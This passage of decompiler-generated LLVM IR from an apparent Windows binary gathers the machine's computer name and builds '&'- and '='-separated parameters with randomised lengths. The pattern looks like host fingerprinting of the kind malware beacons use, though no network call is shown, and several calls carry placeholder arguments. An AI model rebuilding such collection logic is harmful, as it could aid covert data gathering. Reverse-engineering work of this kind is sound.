  store i32 ptrtoint ([13 x i8]* @global_var_1003943c to i32), i32* %377, align 4, !insn.addr !4702
  %412 = add i32 %esp.7.reload, -28, !insn.addr !4703
  %413 = inttoptr i32 %412 to i32*, !insn.addr !4703
  store i32 %411, i32* %413, align 4, !insn.addr !4703
  %414 = load i32, i32* %stack_var_-588, align 4, !insn.addr !4704
  %415 = call i32 @function_10009e60(i32 %414, i32* inttoptr (i32 842230128 to i32*)), !insn.addr !4704
  %416 = ptrtoint i16** %stack_var_-67224 to i32, !insn.addr !4705
  store i32 %416, i32* %377, align 4, !insn.addr !4705
  %417 = ptrtoint i32* %stack_var_-908 to i32, !insn.addr !4706
  store i32 %417, i32* %413, align 4, !insn.addr !4706
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4707
  %418 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4708
  %419 = icmp eq i16* %418, null, !insn.addr !4708
  br i1 %419, label %dec_label_pc_1000842a.dec_label_pc_100085a2_crit_edge, label %dec_label_pc_10008570.preheader, !insn.addr !4709

dec_label_pc_1000842a.dec_label_pc_100085a2_crit_edge: ; preds = %dec_label_pc_1000842a
  %.pre126 = add i32 %esp.7.reload, -32, !insn.addr !4710
  %.pre128 = inttoptr i32 %.pre126 to i32*, !insn.addr !4710
  %.pre130 = add i32 %esp.7.reload, -36
  %.pre132 = inttoptr i32 %.pre130 to i32*
  %.pre134 = add i32 %esp.7.reload, -40, !insn.addr !4711
  %.pre136 = inttoptr i32 %.pre134 to i32*, !insn.addr !4711
  store i32* %.pre136, i32** %.pre-phi137.reg2mem
  store i32* %.pre132, i32** %.pre-phi133.reg2mem
  store i32* %.pre128, i32** %.pre-phi129.reg2mem
  store i32 0, i32* %ecx.6.reg2mem
  br label %dec_label_pc_100085a2

dec_label_pc_10008570.preheader:                  ; preds = %dec_label_pc_1000842a
  %420 = add i32 %93, -904, !insn.addr !4712
  %421 = add i32 %esp.7.reload, -32
  %422 = inttoptr i32 %421 to i32*
  %423 = add i32 %esp.7.reload, -36
  %424 = inttoptr i32 %423 to i32*
  %425 = add i32 %esp.7.reload, -40
  %426 = inttoptr i32 %425 to i32*
  store i32 0, i32* %ecx.5.reg2mem
  br label %dec_label_pc_10008570

dec_label_pc_10008570:                            ; preds = %dec_label_pc_10008570.preheader, %dec_label_pc_10008570
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %427 = mul i32 %ecx.5.reload, 2, !insn.addr !4712
  %428 = add i32 %420, %427, !insn.addr !4712
  %429 = inttoptr i32 %428 to i16*, !insn.addr !4712
  %430 = load i16, i16* %429, align 2, !insn.addr !4712
  %431 = zext i16 %430 to i32, !insn.addr !4712
  store i32 %431, i32* %422, align 4, !insn.addr !4713
  %432 = mul i32 %ecx.5.reload, 4, !insn.addr !4714
  %433 = add i32 %432, %152, !insn.addr !4714
  store i32 ptrtoint ([5 x i8]* @global_var_1003944c to i32), i32* %424, align 4, !insn.addr !4715
  store i32 %433, i32* %426, align 4, !insn.addr !4716
  %434 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4717
  %435 = bitcast i16* %434 to i8*
  %436 = call i32 (i8*, i8*, ...) @wsprintfA(i8* %435, i8* bitcast (i32* @1 to i8*)), !insn.addr !4717
  %437 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4718
  %438 = ptrtoint i16* %437 to i32, !insn.addr !4718
  %439 = add i32 %438, 1, !insn.addr !4719
  %440 = inttoptr i32 %439 to i16*, !insn.addr !4720
  store i16* %440, i16** %stack_var_-67220, align 4, !insn.addr !4720
  %441 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4721
  %442 = ptrtoint i16* %441 to i32, !insn.addr !4721
  %443 = icmp ult i32 %439, %442, !insn.addr !4721
  store i32 %439, i32* %ecx.5.reg2mem, !insn.addr !4722
  br i1 %443, label %dec_label_pc_10008570, label %dec_label_pc_100085a2.loopexit, !insn.addr !4722

dec_label_pc_100085a2.loopexit:                   ; preds = %dec_label_pc_10008570
  %phitmp = mul i32 %439, 4
  store i32* %426, i32** %.pre-phi137.reg2mem
  store i32* %424, i32** %.pre-phi133.reg2mem
  store i32* %422, i32** %.pre-phi129.reg2mem
  store i32 %phitmp, i32* %ecx.6.reg2mem
  br label %dec_label_pc_100085a2

dec_label_pc_100085a2:                            ; preds = %dec_label_pc_1000842a.dec_label_pc_100085a2_crit_edge, %dec_label_pc_100085a2.loopexit
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %.pre-phi129.reload = load i32*, i32** %.pre-phi129.reg2mem
  %.pre-phi133.reload = load i32*, i32** %.pre-phi133.reg2mem
  %.pre-phi137.reload = load i32*, i32** %.pre-phi137.reg2mem
  store i32 %417, i32* %.pre-phi129.reload, align 4, !insn.addr !4710
  %444 = add i32 %ecx.6.reload, %194, !insn.addr !4723
  %445 = inttoptr i32 %444 to i8*, !insn.addr !4723
  store i8 0, i8* %445, align 4, !insn.addr !4723
  %446 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4724
  %447 = call i32 @lstrlenW(i16* %446), !insn.addr !4724
  %448 = icmp slt i32 %447, 1
  %. = select i1 %448, i32 ptrtoint ([5 x i8]* @global_var_10039454 to i32), i32 %152
  store i32 %., i32* %.pre-phi133.reload, align 4
  %449 = ptrtoint i32* %stack_var_-2108 to i32, !insn.addr !4711
  store i32 %449, i32* %.pre-phi137.reload, align 4, !insn.addr !4711
  %450 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4725
  store i16* inttoptr (i32 100 to i16*), i16** %stack_var_-67224, align 4, !insn.addr !4726
  %451 = add i32 %esp.7.reload, -44, !insn.addr !4727
  %452 = inttoptr i32 %451 to i32*, !insn.addr !4727
  store i32 %416, i32* %452, align 4, !insn.addr !4727
  %453 = add i32 %esp.7.reload, -48, !insn.addr !4728
  %454 = inttoptr i32 %453 to i32*, !insn.addr !4728
  %455 = ptrtoint i32* %stack_var_-1108 to i32, !insn.addr !4728
  store i32 %455, i32* %454, align 4, !insn.addr !4728
  %456 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4729
  %457 = call i1 @GetComputerNameW(i16* %456, i32* nonnull @1), !insn.addr !4729
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4730
  %458 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4731
  %459 = icmp eq i16* %458, null, !insn.addr !4731
  br i1 %459, label %dec_label_pc_100085a2.dec_label_pc_10008645_crit_edge, label %dec_label_pc_10008610.preheader, !insn.addr !4732

dec_label_pc_100085a2.dec_label_pc_10008645_crit_edge: ; preds = %dec_label_pc_100085a2
  %.pre138 = add i32 %esp.7.reload, -52, !insn.addr !4733
  %.pre140 = inttoptr i32 %.pre138 to i32*, !insn.addr !4733
  %.pre142 = add i32 %esp.7.reload, -56, !insn.addr !4734
  %.pre144 = inttoptr i32 %.pre142 to i32*, !insn.addr !4734
  %.pre146 = add i32 %esp.7.reload, -60, !insn.addr !4735
  %.pre148 = inttoptr i32 %.pre146 to i32*, !insn.addr !4735
  store i32* %.pre148, i32** %.pre-phi149.reg2mem
  store i32* %.pre144, i32** %.pre-phi145.reg2mem
  store i32* %.pre140, i32** %.pre-phi141.reg2mem
  store i32 %.pre138, i32* %.pre-phi139.reg2mem
  store i32 0, i32* %ecx.8.reg2mem
  br label %dec_label_pc_10008645

dec_label_pc_10008610.preheader:                  ; preds = %dec_label_pc_100085a2
  %460 = add i32 %93, -1104, !insn.addr !4736
  %461 = add i32 %esp.7.reload, -52
  %462 = inttoptr i32 %461 to i32*
  %463 = add i32 %esp.7.reload, -56
  %464 = inttoptr i32 %463 to i32*
  %465 = add i32 %esp.7.reload, -60
  %466 = inttoptr i32 %465 to i32*
  store i32 0, i32* %ecx.7.reg2mem
  br label %dec_label_pc_10008610

dec_label_pc_10008610:                            ; preds = %dec_label_pc_10008610.preheader, %dec_label_pc_10008610
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %467 = mul i32 %ecx.7.reload, 2, !insn.addr !4736
  %468 = add i32 %460, %467, !insn.addr !4736
  %469 = inttoptr i32 %468 to i16*, !insn.addr !4736
  %470 = load i16, i16* %469, align 2, !insn.addr !4736
  %471 = zext i16 %470 to i32, !insn.addr !4736
  store i32 %471, i32* %462, align 4, !insn.addr !4737
  %472 = mul i32 %ecx.7.reload, 4, !insn.addr !4738
  %473 = add i32 %472, %152, !insn.addr !4738
  store i32 ptrtoint ([5 x i8]* @global_var_1003944c to i32), i32* %464, align 4, !insn.addr !4739
  store i32 %473, i32* %466, align 4, !insn.addr !4740
  %474 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4741
  %475 = ptrtoint i16* %474 to i32, !insn.addr !4741
  %476 = call i32 @function_100073f0(i32 %475, i32 ptrtoint (i32* @1 to i32)), !insn.addr !4741
  %477 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4742
  %478 = ptrtoint i16* %477 to i32, !insn.addr !4742
  %479 = add i32 %478, 1, !insn.addr !4743
  %480 = inttoptr i32 %479 to i16*, !insn.addr !4744
  store i16* %480, i16** %stack_var_-67220, align 4, !insn.addr !4744
  %481 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4745
  %482 = ptrtoint i16* %481 to i32, !insn.addr !4745
  %483 = icmp ult i32 %479, %482, !insn.addr !4745
  store i32 %479, i32* %ecx.7.reg2mem, !insn.addr !4746
  br i1 %483, label %dec_label_pc_10008610, label %dec_label_pc_10008645.loopexit, !insn.addr !4746

dec_label_pc_10008645.loopexit:                   ; preds = %dec_label_pc_10008610
  %phitmp73 = mul i32 %479, 4
  store i32* %466, i32** %.pre-phi149.reg2mem
  store i32* %464, i32** %.pre-phi145.reg2mem
  store i32* %462, i32** %.pre-phi141.reg2mem
  store i32 %461, i32* %.pre-phi139.reg2mem
  store i32 %phitmp73, i32* %ecx.8.reg2mem
  br label %dec_label_pc_10008645

dec_label_pc_10008645:                            ; preds = %dec_label_pc_100085a2.dec_label_pc_10008645_crit_edge, %dec_label_pc_10008645.loopexit
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %.pre-phi139.reload = load i32, i32* %.pre-phi139.reg2mem
  %.pre-phi141.reload = load i32*, i32** %.pre-phi141.reg2mem
  %.pre-phi145.reload = load i32*, i32** %.pre-phi145.reg2mem
  %.pre-phi149.reload = load i32*, i32** %.pre-phi149.reg2mem
  store i32 99, i32* %.pre-phi141.reload, align 4, !insn.addr !4733
  %484 = add i32 %ecx.8.reload, %194, !insn.addr !4747
  %485 = inttoptr i32 %484 to i8*, !insn.addr !4747
  store i8 0, i8* %485, align 4, !insn.addr !4747
  store i32 0, i32* %.pre-phi145.reload, align 4, !insn.addr !4734
  %486 = ptrtoint i32* %stack_var_-707 to i32, !insn.addr !4735
  store i32 %486, i32* %.pre-phi149.reload, align 4, !insn.addr !4735
  %487 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4748
  %488 = bitcast i16* %487 to i32*
  %489 = call i32* @_memset(i32* %488, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4748
  %490 = ptrtoint i32* %stack_var_-708 to i32, !insn.addr !4749
  store i32 4023078, i32* %stack_var_-708, align 4, !insn.addr !4750
  store i32 %490, i32* %edx.2.reg2mem, !insn.addr !4751
  br label %dec_label_pc_10008672, !insn.addr !4751

dec_label_pc_10008672:                            ; preds = %dec_label_pc_10008672, %dec_label_pc_10008645
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %491 = inttoptr i32 %edx.2.reload to i8*, !insn.addr !4752
  %492 = load i8, i8* %491, align 1, !insn.addr !4752
  %493 = add i32 %edx.2.reload, 1, !insn.addr !4753
  %494 = icmp eq i8 %492, 0, !insn.addr !4754
  %495 = icmp eq i1 %494, false, !insn.addr !4755
  store i32 %493, i32* %edx.2.reg2mem, !insn.addr !4755
  store i32 %352, i32* %edi.2.reg2mem, !insn.addr !4755
  br i1 %495, label %dec_label_pc_10008672, label %dec_label_pc_10008682, !insn.addr !4755

dec_label_pc_10008682:                            ; preds = %dec_label_pc_10008672, %dec_label_pc_10008682
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %496 = add i32 %edi.2.reload, 1, !insn.addr !4756
  %497 = inttoptr i32 %496 to i8*
  %498 = load i8, i8* %497, align 1, !insn.addr !4756
  %499 = icmp eq i8 %498, 0, !insn.addr !4757
  %500 = icmp eq i1 %499, false, !insn.addr !4758
  store i32 %496, i32* %edi.2.reg2mem, !insn.addr !4758
  br i1 %500, label %dec_label_pc_10008682, label %dec_label_pc_1000868a, !insn.addr !4758

dec_label_pc_1000868a:                            ; preds = %dec_label_pc_10008682
  %501 = sub i32 %493, %490, !insn.addr !4759
  %502 = udiv i32 %501, 4, !insn.addr !4760
  %503 = bitcast i32* %stack_var_-708 to i8*, !insn.addr !4761
  call void @__asm_rep_movsd_memcpy(i8* %497, i8* nonnull %503, i32 %502), !insn.addr !4761
  %504 = mul i32 %502, %361, !insn.addr !4761
  %505 = add i32 %496, %504, !insn.addr !4761
  %506 = and i32 %501, 3, !insn.addr !4762
  %507 = inttoptr i32 %505 to i8*, !insn.addr !4763
  call void @__asm_rep_movsb_memcpy(i8* %507, i8* %507, i32 %506), !insn.addr !4763
  store i32 %455, i32* %.pre-phi141.reload, align 4, !insn.addr !4764
  %508 = call i32 @lstrlenW(i16* bitcast (i32* @1 to i16*)), !insn.addr !4765
  %509 = icmp slt i32 %508, 1
  store i32 %152, i32* %edx.3.reg2mem, !insn.addr !4766
  store i32 %352, i32* %ecx.9.reg2mem, !insn.addr !4766
  br i1 %509, label %dec_label_pc_100086e0, label %dec_label_pc_100086b0, !insn.addr !4766

dec_label_pc_100086b0:                            ; preds = %dec_label_pc_1000868a, %dec_label_pc_100086b0
  %edx.3.reload = load i32, i32* %edx.3.reg2mem
  %510 = inttoptr i32 %edx.3.reload to i8*, !insn.addr !4767
  %511 = load i8, i8* %510, align 1, !insn.addr !4767
  %512 = add i32 %edx.3.reload, 1, !insn.addr !4768
  %513 = icmp eq i8 %511, 0, !insn.addr !4769
  %514 = icmp eq i1 %513, false, !insn.addr !4770
  store i32 %512, i32* %edx.3.reg2mem, !insn.addr !4770
  store i32 %352, i32* %edi.3.reg2mem, !insn.addr !4770
  br i1 %514, label %dec_label_pc_100086b0, label %dec_label_pc_100086c0, !insn.addr !4770

dec_label_pc_100086c0:                            ; preds = %dec_label_pc_100086b0, %dec_label_pc_100086c0
  %edi.3.reload = load i32, i32* %edi.3.reg2mem
  %515 = add i32 %edi.3.reload, 1, !insn.addr !4771
  %516 = inttoptr i32 %515 to i8*
  %517 = load i8, i8* %516, align 1, !insn.addr !4771
  %518 = icmp eq i8 %517, 0, !insn.addr !4772
  %519 = icmp eq i1 %518, false, !insn.addr !4773
  store i32 %515, i32* %edi.3.reg2mem, !insn.addr !4773
  br i1 %519, label %dec_label_pc_100086c0, label %dec_label_pc_100086c8, !insn.addr !4773

dec_label_pc_100086c8:                            ; preds = %dec_label_pc_100086c0
  %520 = sub i32 %512, %152, !insn.addr !4774
  %521 = udiv i32 %520, 4, !insn.addr !4775
  %522 = bitcast i32* %stack_var_-144 to i8*, !insn.addr !4776
  call void @__asm_rep_movsd_memcpy(i8* %516, i8* nonnull %522, i32 %521), !insn.addr !4776
  %523 = mul i32 %521, %361, !insn.addr !4776
  %524 = add i32 %515, %523, !insn.addr !4776
  %525 = and i32 %520, 3, !insn.addr !4777
  %526 = inttoptr i32 %524 to i8*, !insn.addr !4778
  call void @__asm_rep_movsb_memcpy(i8* %526, i8* %526, i32 %525), !insn.addr !4778
  br label %dec_label_pc_100086f9, !insn.addr !4779

dec_label_pc_100086e0:                            ; preds = %dec_label_pc_1000868a, %dec_label_pc_100086e0
  %ecx.9.reload = load i32, i32* %ecx.9.reg2mem
  %527 = add i32 %ecx.9.reload, 1, !insn.addr !4780
  %528 = inttoptr i32 %527 to i8*, !insn.addr !4780
  %529 = load i8, i8* %528, align 1, !insn.addr !4780
  %530 = icmp eq i8 %529, 0, !insn.addr !4781
  %531 = icmp eq i1 %530, false, !insn.addr !4782
  store i32 %527, i32* %ecx.9.reg2mem, !insn.addr !4782
  br i1 %531, label %dec_label_pc_100086e0, label %dec_label_pc_100086ea, !insn.addr !4782

dec_label_pc_100086ea:                            ; preds = %dec_label_pc_100086e0
  %532 = inttoptr i32 %527 to i32*, !insn.addr !4783
  store i32 1128877653, i32* %532, align 4, !insn.addr !4783
  %533 = add i32 %ecx.9.reload, 5, !insn.addr !4784
  %534 = inttoptr i32 %533 to i8*, !insn.addr !4784
  store i8 0, i8* %534, align 1, !insn.addr !4784
  br label %dec_label_pc_100086f9, !insn.addr !4784

dec_label_pc_100086f9:                            ; preds = %dec_label_pc_100086ea, %dec_label_pc_100086c8
  %535 = ptrtoint i32* %stack_var_-156 to i32, !insn.addr !4785
  store i32 %535, i32* %edx.4.reg2mem, !insn.addr !4786
  br label %dec_label_pc_10008701, !insn.addr !4786

dec_label_pc_10008701:                            ; preds = %dec_label_pc_10008701, %dec_label_pc_100086f9
  %edx.4.reload = load i32, i32* %edx.4.reg2mem
  %536 = inttoptr i32 %edx.4.reload to i8*, !insn.addr !4787
  %537 = load i8, i8* %536, align 1, !insn.addr !4787
  %538 = add i32 %edx.4.reload, 1, !insn.addr !4788
  %539 = icmp eq i8 %537, 0, !insn.addr !4789
  %540 = icmp eq i1 %539, false, !insn.addr !4790
  store i32 %538, i32* %edx.4.reg2mem, !insn.addr !4790
  store i32 %352, i32* %edi.4.reg2mem, !insn.addr !4790
  br i1 %540, label %dec_label_pc_10008701, label %dec_label_pc_10008711, !insn.addr !4790

dec_label_pc_10008711:                            ; preds = %dec_label_pc_10008701, %dec_label_pc_10008711
  %edi.4.reload = load i32, i32* %edi.4.reg2mem
  %541 = add i32 %edi.4.reload, 1, !insn.addr !4791
  %542 = inttoptr i32 %541 to i8*
  %543 = load i8, i8* %542, align 1, !insn.addr !4791
  %544 = icmp eq i8 %543, 0, !insn.addr !4792
  %545 = icmp eq i1 %544, false, !insn.addr !4793
  store i32 %541, i32* %edi.4.reg2mem, !insn.addr !4793
  br i1 %545, label %dec_label_pc_10008711, label %dec_label_pc_10008719, !insn.addr !4793

dec_label_pc_10008719:                            ; preds = %dec_label_pc_10008711
  %546 = sub i32 %538, %535, !insn.addr !4794
  %547 = udiv i32 %546, 4, !insn.addr !4795
  %548 = bitcast i32* %stack_var_-156 to i8*, !insn.addr !4796
  call void @__asm_rep_movsd_memcpy(i8* %542, i8* nonnull %548, i32 %547), !insn.addr !4796
  %549 = mul i32 %547, %361, !insn.addr !4796
  %550 = add i32 %541, %549, !insn.addr !4796
  %551 = and i32 %546, 3, !insn.addr !4797
  %552 = inttoptr i32 %550 to i8*, !insn.addr !4798
  call void @__asm_rep_movsb_memcpy(i8* %552, i8* %552, i32 %551), !insn.addr !4798
  %553 = call i32 @function_10007860(), !insn.addr !4799
  %554 = ptrtoint i128* %stack_var_-26132 to i32
  %555 = ptrtoint i32* %stack_var_-66132 to i32
  %556 = ptrtoint i32* %stack_var_-66133 to i32
  %557 = bitcast i32* %stack_var_-144 to i8*
  %558 = ptrtoint i32* %stack_var_-4132 to i32
  %559 = add i32 %93, -4128
  %560 = bitcast i32* %stack_var_-4132 to i8*
  store i32 %.pre-phi139.reload, i32* %esp.12.reg2mem, !insn.addr !4799
  br label %dec_label_pc_10008732, !insn.addr !4799

dec_label_pc_10008732:                            ; preds = %dec_label_pc_1000891a, %dec_label_pc_10008719
  %esp.12.reload = load i32, i32* %esp.12.reg2mem
  %561 = call i32 @GetTickCount(), !insn.addr !4800
  %562 = add i32 %esp.12.reload, -4, !insn.addr !4801
  %563 = inttoptr i32 %562 to i32*, !insn.addr !4801
  store i32 %561, i32* %563, align 4, !insn.addr !4801
  call void @_srand(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4802
  store i32 %554, i32* %563, align 4, !insn.addr !4803
  %564 = add i32 %esp.12.reload, -8, !insn.addr !4804
  %565 = inttoptr i32 %564 to i32*, !insn.addr !4804
  store i32 %555, i32* %565, align 4, !insn.addr !4804
  %566 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4805
  %567 = add i32 %esp.12.reload, -12, !insn.addr !4806
  %568 = inttoptr i32 %567 to i32*, !insn.addr !4806
  store i32 ptrtoint (i32* @global_var_1003945c to i32), i32* %568, align 4, !insn.addr !4806
  %569 = add i32 %esp.12.reload, -16, !insn.addr !4807
  %570 = inttoptr i32 %569 to i32*, !insn.addr !4807
  store i32 %555, i32* %570, align 4, !insn.addr !4807
  %571 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4808
  %572 = add i32 %esp.12.reload, -20, !insn.addr !4809
  %573 = inttoptr i32 %572 to i32*, !insn.addr !4809
  store i32 %449, i32* %573, align 4, !insn.addr !4809
  %574 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !4810
  %575 = inttoptr i32 %574 to i16*, !insn.addr !4811
  store i16* %575, i16** %stack_var_-67224, align 4, !insn.addr !4811
  store i16* null, i16** %stack_var_-67220, align 4, !insn.addr !4812
  store i32 0, i32* %stack_var_-67232.0.reg2mem, !insn.addr !4813
  store i32 0, i32* %eax.14.reg2mem, !insn.addr !4813
  store i32 %572, i32* %esp.13.reg2mem, !insn.addr !4813
  br label %dec_label_pc_10008790, !insn.addr !4813

dec_label_pc_10008790:                            ; preds = %dec_label_pc_10008898, %dec_label_pc_10008732
  %esp.13.reload = load i32, i32* %esp.13.reg2mem
  %eax.14.reload = load i32, i32* %eax.14.reg2mem
  %stack_var_-67232.0.reload = load i32, i32* %stack_var_-67232.0.reg2mem
  %576 = icmp eq i32 %eax.14.reload, 0, !insn.addr !4814
  store i32 %556, i32* %edi.5.reg2mem, !insn.addr !4815
  br i1 %576, label %dec_label_pc_100087b3, label %dec_label_pc_100087a0, !insn.addr !4815

dec_label_pc_100087a0:                            ; preds = %dec_label_pc_10008790, %dec_label_pc_100087a0
  %edi.5.reload = load i32, i32* %edi.5.reg2mem
  %577 = add i32 %edi.5.reload, 1, !insn.addr !4816
  %578 = inttoptr i32 %577 to i8*, !insn.addr !4816
  %579 = load i8, i8* %578, align 1, !insn.addr !4816
  %580 = icmp eq i8 %579, 0, !insn.addr !4817
  %581 = icmp eq i1 %580, false, !insn.addr !4818
  store i32 %577, i32* %edi.5.reg2mem, !insn.addr !4818
  br i1 %581, label %dec_label_pc_100087a0, label %dec_label_pc_100087aa, !insn.addr !4818

dec_label_pc_100087aa:                            ; preds = %dec_label_pc_100087a0
  %582 = inttoptr i32 %577 to i16*, !insn.addr !4819
  store i16 38, i16* %582, align 2, !insn.addr !4819
  br label %dec_label_pc_100087b3, !insn.addr !4819

dec_label_pc_100087b3:                            ; preds = %dec_label_pc_100087aa, %dec_label_pc_10008790
  %583 = call i32 @function_10007940(), !insn.addr !4820
  %584 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4821
  %585 = ptrtoint i16* %584 to i32, !insn.addr !4821
  %586 = add i32 %585, 48, !insn.addr !4822
  %587 = add i32 %esp.13.reload, -4, !insn.addr !4823
  %588 = inttoptr i32 %587 to i32*, !insn.addr !4823
  store i32 %586, i32* %588, align 4, !insn.addr !4823
  %589 = add i32 %esp.13.reload, -8, !insn.addr !4824
  %590 = inttoptr i32 %589 to i32*, !insn.addr !4824
  store i32 %152, i32* %590, align 4, !insn.addr !4824
  %591 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !4825
  %592 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4826
  %593 = icmp eq i16* %592, inttoptr (i32 3 to i16*), !insn.addr !4826
  br i1 %593, label %dec_label_pc_100087f1, label %dec_label_pc_100087da, !insn.addr !4827

dec_label_pc_100087da:                            ; preds = %dec_label_pc_100087b3
  %594 = call i32 @_rand(), !insn.addr !4828
  %595 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4829
  %596 = ptrtoint i16* %595 to i32, !insn.addr !4829
  %597 = udiv i32 %596, 4, !insn.addr !4830
  %598 = urem i32 %594, %597
  %599 = add nuw nsw i32 %598, 1, !insn.addr !4831
  store i32 %599, i32* %storemerge.reg2mem, !insn.addr !4832
  br label %dec_label_pc_100087f9, !insn.addr !4832

dec_label_pc_100087f1:                            ; preds = %dec_label_pc_100087b3
  %600 = load i16*, i16** %stack_var_-67224, align 4, !insn.addr !4833
  %601 = ptrtoint i16* %600 to i32, !insn.addr !4833
  %602 = sub i32 %601, %stack_var_-67232.0.reload, !insn.addr !4834
  store i32 %602, i32* %storemerge.reg2mem, !insn.addr !4834
  br label %dec_label_pc_100087f9, !insn.addr !4834

dec_label_pc_100087f9:                            ; preds = %dec_label_pc_100087f1, %dec_label_pc_100087da
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  store i32 %152, i32* %edx.5.reg2mem, !insn.addr !4835
  br label %dec_label_pc_10008801, !insn.addr !4835

dec_label_pc_10008801:                            ; preds = %dec_label_pc_10008801, %dec_label_pc_100087f9
  %edx.5.reload = load i32, i32* %edx.5.reg2mem
  %603 = inttoptr i32 %edx.5.reload to i8*, !insn.addr !4836
  %604 = load i8, i8* %603, align 1, !insn.addr !4836
  %605 = add i32 %edx.5.reload, 1, !insn.addr !4837
  %606 = icmp eq i8 %604, 0, !insn.addr !4838
  %607 = icmp eq i1 %606, false, !insn.addr !4839
  store i32 %605, i32* %edx.5.reg2mem, !insn.addr !4839
  store i32 %556, i32* %edi.6.reg2mem, !insn.addr !4839
  br i1 %607, label %dec_label_pc_10008801, label %dec_label_pc_10008811, !insn.addr !4839

dec_label_pc_10008811:                            ; preds = %dec_label_pc_10008801, %dec_label_pc_10008811
  %edi.6.reload = load i32, i32* %edi.6.reg2mem
  %608 = add i32 %edi.6.reload, 1, !insn.addr !4840
  %609 = inttoptr i32 %608 to i8*
  %610 = load i8, i8* %609, align 1, !insn.addr !4840
  %611 = icmp eq i8 %610, 0, !insn.addr !4841
  %612 = icmp eq i1 %611, false, !insn.addr !4842
  store i32 %608, i32* %edi.6.reg2mem, !insn.addr !4842
  br i1 %612, label %dec_label_pc_10008811, label %dec_label_pc_10008819, !insn.addr !4842

dec_label_pc_10008819:                            ; preds = %dec_label_pc_10008811
  %613 = sub i32 %605, %152, !insn.addr !4843
  %614 = udiv i32 %613, 4, !insn.addr !4844
  call void @__asm_rep_movsd_memcpy(i8* %609, i8* nonnull %557, i32 %614), !insn.addr !4845
  %615 = mul i32 %614, %361, !insn.addr !4845
  %616 = add i32 %608, %615, !insn.addr !4845
  %617 = and i32 %613, 3, !insn.addr !4846
  %618 = inttoptr i32 %616 to i8*, !insn.addr !4847
  call void @__asm_rep_movsb_memcpy(i8* %618, i8* %618, i32 %617), !insn.addr !4847
  store i32 %556, i32* %edi.7.reg2mem, !insn.addr !4848
  br label %dec_label_pc_10008830, !insn.addr !4848

dec_label_pc_10008830:                            ; preds = %dec_label_pc_10008830, %dec_label_pc_10008819
  %edi.7.reload = load i32, i32* %edi.7.reg2mem
  %619 = add i32 %edi.7.reload, 1, !insn.addr !4849
  %620 = inttoptr i32 %619 to i8*, !insn.addr !4849
  %621 = load i8, i8* %620, align 1, !insn.addr !4849
  %622 = icmp eq i8 %621, 0, !insn.addr !4850
  %623 = icmp eq i1 %622, false, !insn.addr !4851
  store i32 %619, i32* %edi.7.reg2mem, !insn.addr !4851
  br i1 %623, label %dec_label_pc_10008830, label %dec_label_pc_1000883a, !insn.addr !4851

dec_label_pc_1000883a:                            ; preds = %dec_label_pc_10008830
  %624 = inttoptr i32 %619 to i16*, !insn.addr !4852
  store i16 61, i16* %624, align 2, !insn.addr !4852
  %625 = add i32 %stack_var_-67232.0.reload, %449, !insn.addr !4853
  %626 = add i32 %esp.13.reload, -12, !insn.addr !4854
  %627 = inttoptr i32 %626 to i32*
  store i32 %storemerge.reload, i32* %627, align 4, !insn.addr !4854
  %628 = add i32 %esp.13.reload, -16, !insn.addr !4855
  %629 = inttoptr i32 %628 to i32*
  store i32 %625, i32* %629, align 4, !insn.addr !4855
  %630 = add i32 %esp.13.reload, -20, !insn.addr !4856
  %631 = inttoptr i32 %630 to i32*, !insn.addr !4856
  store i32 %558, i32* %631, align 4, !insn.addr !4856
  %632 = call i8* @_strncpy(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4857
  %633 = icmp ult i32 %storemerge.reload, 1000, !insn.addr !4858
  %634 = icmp eq i1 %633, false, !insn.addr !4859
  br i1 %634, label %dec_label_pc_10008949, label %dec_label_pc_1000886e, !insn.addr !4859

dec_label_pc_1000886e:                            ; preds = %dec_label_pc_1000883a
  %635 = add i32 %559, %storemerge.reload, !insn.addr !4860
  %636 = inttoptr i32 %635 to i8*, !insn.addr !4860
  store i8 0, i8* %636, align 1, !insn.addr !4860
  store i32 %558, i32* %edx.6.reg2mem, !insn.addr !4861
  br label %dec_label_pc_10008880, !insn.addr !4861

dec_label_pc_10008880:                            ; preds = %dec_label_pc_10008880, %dec_label_pc_1000886e
  %edx.6.reload = load i32, i32* %edx.6.reg2mem
  %637 = inttoptr i32 %edx.6.reload to i8*, !insn.addr !4862
  %638 = load i8, i8* %637, align 1, !insn.addr !4862
  %639 = add i32 %edx.6.reload, 1, !insn.addr !4863
  %640 = icmp eq i8 %638, 0, !insn.addr !4864
  %641 = icmp eq i1 %640, false, !insn.addr !4865
